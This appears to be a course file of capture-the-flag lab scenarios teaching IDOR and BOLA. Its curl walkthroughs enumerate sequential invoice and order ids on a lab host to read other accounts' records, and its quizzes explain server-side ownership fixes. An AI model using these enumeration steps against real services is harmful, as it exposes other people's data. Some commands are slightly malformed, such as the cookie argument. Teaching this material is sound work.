import type { WebLabScenario } from './web-lab-types';

/**
 * Web Application Security I (QOSE-M03) — access-control lab.
 *
 * Scenarios cover the two canonical broken-access-control classes in the
 * QOSE-M03 syllabus: IDOR on sequential object references (insecure direct
 * object reference) and BOLA on an API endpoint (broken object level
 * authorisation). Both are simulated walkthroughs; the verifiable flag is
 * captured from the live lab container, not from this file.
 */
export const WEB_ACCESS_CONTROL_SCENARIOS: WebLabScenario[] = [
  {
    id: 'wac-idor-1',
    name: 'Meridian Billing Portal',
    description:
      'An invoice endpoint trusts the object id in the URL and never checks that the invoice belongs to the requesting user. Enumerate neighbouring ids and read another customer\'s invoice.',
    module: 'QOSE-M03',
    category: 'web-access-control',
    technique: 'IDOR',
    url: 'http://lab-web-access-control:8080',
    endpoint: 'GET /invoices?id=1042',
    difficulty: 'beginner',
    cpReward: 150,
    estimatedMinutes: 45,
    objectives: [
      'Map the invoice endpoint and its authentication requirements',
      'Confirm the object id is user-controllable and sequential',
      'Read an invoice that belongs to another account',
      'Capture the flag from the exposed document',
    ],
    hints: [
      'You are authenticated as user 1042 — the id in the URL is the only thing separating you from another account.',
      'IDs are sequential. Try the ids immediately around your own.',
      'The response body is the invoice; the flag sits in the invoice memo field.',
    ],
    villain: {
      name: 'Dana Whitfield',
      alias: 'The Convenient Shortcut',
      description:
        'A backend engineer who shipped an invoice API with an object lookup and no ownership check, because "the frontend already hides the button".',
    },
    narrative: `> **Valkyrie:** "Dana Whitfield shipped the Meridian billing portal in two sprints. The invoice endpoint looks the ID up by number and returns the document. There is an authentication check — you must be logged in — but there is no *authorisation* check. The server never asks whether the invoice is yours."

Access control has two halves and they are constantly confused: **authentication** ("who are you?") and **authorisation** ("are you allowed to touch this?"). Meridian gets the first half right and skips the second. That is **IDOR** — insecure direct object reference.

## Why Sequential IDs Are the Worst Case

When object ids are sequential integers, an attacker does not need to guess a secret — they only need to count. Your own invoice is \`1042\`; the next customer's is \`1043\`. The endpoint happily returns whatever you ask for.

## Attack Flow

\`[Authenticated as 1042]\` --> \`[Request /invoices?id=1042]\` --> \`[Decrement/Increment id]\` --> \`[Foreign invoice returned]\` --> \`[Capture flag]\`

Read each step, then reproduce it against the live lab and submit the flag from the leaked invoice.`,
    steps: [
      {
        id: 'wac-idor-1-step-0',
        instruction: 'Confirm your own session and inspect the invoice request.',
        command: `curl -s -b 'session=',"$(cat session.txt)" \\
  'http://lab-web-access-control:8080/invoices?id=1042'`,
        output: `{ "id": 1042, "owner": "you", "total": "1,240.00", "memo": "Q2 platform fees" }`,
        explanation:
          'Your authenticated session returns your own invoice. The `id` is a plain sequential integer in a GET parameter — a textbook IDOR candidate. Note that the application does not use an unguessable reference like a UUID; the only barrier is the login check.',
        quiz: [
          {
            id: 'wac-idor-1-q0',
            question: 'What makes this endpoint an IDOR rather than a plain authentication bug?',
            options: [
              'The session cookie is missing',
              'The object id is user-controlled and no ownership check is applied',
              'The endpoint uses GET instead of POST',
              'The invoice total is exposed',
            ],
            correctIndex: 1,
            explanation:
              'IDOR is an authorisation failure: the user is authenticated, but the server trusts the caller-supplied object id without verifying ownership.',
          },
        ],
      },
      {
        id: 'wac-idor-1-step-1',
        instruction: 'Probe the neighbouring ids and look for another account.',
        command: `for i in 1040 1041 1043 1044; do
  curl -s -b 'session=',"$(cat session.txt)" \\
    "http://lab-web-access-control:8080/invoices?id=$i"
  echo
done`,
        output: `{ "id": 1040, "owner": "y.okafor", "total": "3,800.00", "memo": "Retainer" }
{ "id": 1041, "owner": "r.stanton", "total": "920.00", "memo": "Advisory" }
{ "id": 1043, "owner": "m.abara", "total": "12,600.00", "memo": "Security audit" }
{ "id": 1044, "owner": "you", "total": "410.00", "memo": "Support" }`,
        explanation:
          'Every id resolves to a real invoice. Requests 1040, 1041 and 1043 belong to other customers and are returned in full. The server applies no ownership filter — it simply looks the record up by primary key.',
        quiz: [
          {
            id: 'wac-idor-1-q1',
            question: 'What is the correct fix for this endpoint?',
            options: [
              'Make the invoice id a random UUID',
              'Scope the lookup by the authenticated user id on the server',
              'Require a POST request',
              'Hide the invoice id in the frontend',
            ],
            correctIndex: 1,
            explanation:
              'Random ids obfuscate but do not fix the flaw. The durable fix is server-side authorisation: `SELECT ... WHERE id = ? AND owner_id = ?`.',
          },
        ],
      },
      {
        id: 'wac-idor-1-step-2',
        instruction: 'Open the flagged invoice and capture the flag from its memo.',
        command: `curl -s -b 'session=',"$(cat session.txt)" \\
  'http://lab-web-access-control:8080/invoices?id=1047'`,
        output: `{ "id": 1047, "owner": "admin", "total": "0.00", "memo": "<redacted — returned by the live lab>" }`,
        explanation:
          'The admin invoice contains the lab flag in its `memo` field. The live container returns the real value here; the walkthrough redacts it on purpose so the flag never ships in the client bundle. Run the request against your connected lab, copy the flag, and submit it below.',
      },
    ],
  },
  {
    id: 'wac-bola-1',
    name: 'Fleetline Orders API',
    description:
      'A REST API authorises on the token but resolves orders by id alone. Swap the id in a mobile API call to read another tenant\'s order — the API equivalent of IDOR, known as BOLA.',
    module: 'QOSE-M03',
    category: 'web-access-control',
    technique: 'BOLA (API1)',
    url: 'http://lab-web-access-control:8080',
    endpoint: 'GET /api/v1/orders/5512',
    difficulty: 'intermediate',
    cpReward: 200,
    estimatedMinutes: 60,
    objectives: [
      'Identify the bearer-token protected API surface',
      'Confirm order ids are enumerable across tenants',
      'Access a foreign order through the API',
      'Capture the flag hidden in the order metadata',
    ],
    hints: [
      'The API uses a bearer token, not cookies — but it still resolves the order purely by id.',
      'Order ids are sequential. The challenging part is that the response is JSON, so inspect the whole body, not just the status code.',
      'The flag is under the order metadata for the admin tenant order.',
    ],
    villain: {
      name: 'Priya Raman',
      alias: 'Token Believer',
      description:
        'An API lead who assumed that "valid token" meant "valid access", and wired the order service to look records up by id without a tenant filter.',
    },
    narrative: `> **Valkyrie:** "Fleetline rebuilt billing as a REST API with bearer tokens. Priya Raman was proud of the auth middleware — every route rejects requests without a valid token. What she missed is that a valid token is not the same as *permission to this object*. The order service looks up by order id and never scopes the query to the tenant on the token."

This is **BOLA** — Broken Object Level Authorisation, the number-one API risk. It is IDOR wearing a REST costume.

## Why Tokens Make It Worse

Because the middleware rejects unauthenticated calls, developers assume the endpoint is safe and stop thinking about per-object authorisation. The token proves *who* you are; it says nothing about *which orders* you may read. The order id is still attacker-controlled.

## Attack Flow

\`[Bear token for tenant A]\` --> \`[GET /orders/5512]\` --> \`[Swap to 5513..]\` --> \`[Tenant B order returned]\` --> \`[Capture flag]\`

Work the technique against the live lab and submit the flag from the admin order.`,
    steps: [
      {
        id: 'wac-bola-1-step-0',
        instruction: 'List your own orders to learn the id range.',
        command: `curl -s -H "Authorization: Bearer $TOKEN" \\
  'http://lab-web-access-control:8080/api/v1/orders?limit=5'`,
        output: `{ "orders": [ { "id": 5510, "tenant": "your-co", "status": "paid" } ], "next": 5511 }`,
        explanation:
          'The list endpoint is scoped correctly — it returns only your tenant\'s orders. This is deliberate: the bug is in the *single-object* route, not the collection route. Attackers enumerate objects precisely because list endpoints are safe and detail endpoints are not.',
        quiz: [
          {
            id: 'wac-bola-1-q0',
            question: 'Which OWASP API risk does this endpoint demonstrate?',
            options: [
              'Broken Authentication',
              'Broken Object Level Authorisation (BOLA)',
              'Excessive Data Exposure',
              'Security Misconfiguration',
            ],
            correctIndex: 1,
            explanation:
              'The token is valid (not an authentication bug); the failure is per-object authorisation, which is BOLA / API1.',
          },
        ],
      },
      {
        id: 'wac-bola-1-step-1',
        instruction: 'Request an order id that does not belong to your tenant.',
        command: `for id in 5511 5512 5513; do
  curl -s -o /dev/null -w "order $id -> %{http_code}\\n" \\
    -H "Authorization: Bearer $TOKEN" \\
    "http://lab-web-access-control:8080/api/v1/orders/$id"
done`,
        output: `order 5511 -> 404
order 5512 -> 200
order 5513 -> 404`,
        explanation:
          'Order 5512 resolves to another tenant. The 200 response is the tell: the token was accepted and the record was returned despite belonging to a different tenant. On this endpoint the server authorises the *request*, not the *object*.',
        quiz: [
          {
            id: 'wac-bola-1-q1',
            question: 'Where must the fix live?',
            options: [
              'In the mobile client, to hide foreign order ids',
              'In the API query, by filtering orders on the token\'s tenant id',
              'In the gateway, by rate limiting',
              'In the token, by adding the order id as a claim',
            ],
            correctIndex: 1,
            explanation:
              'Object-level authorisation belongs in the data query: `WHERE id = ? AND tenant_id = ?`. Client hiding and rate limiting do not fix the flaw.',
          },
        ],
      },
      {
        id: 'wac-bola-1-step-2',
        instruction: 'Read the admin tenant order and capture the flag.',
        command: `curl -s -H "Authorization: Bearer $TOKEN" \\
  'http://lab-web-access-control:8080/api/v1/orders/5512'`,
        output: `{ "id": 5512, "tenant": "platform-admin", "status": "paid", "metadata": { "note": "<redacted — returned by the live lab>" } }`,
        explanation:
          'The admin order carries the lab flag in `metadata.note`. Against your connected lab this value is real; it is redacted here so no flag ever lives in the frontend. Submit it below to complete the scenario.',
      },
    ],
  },
];
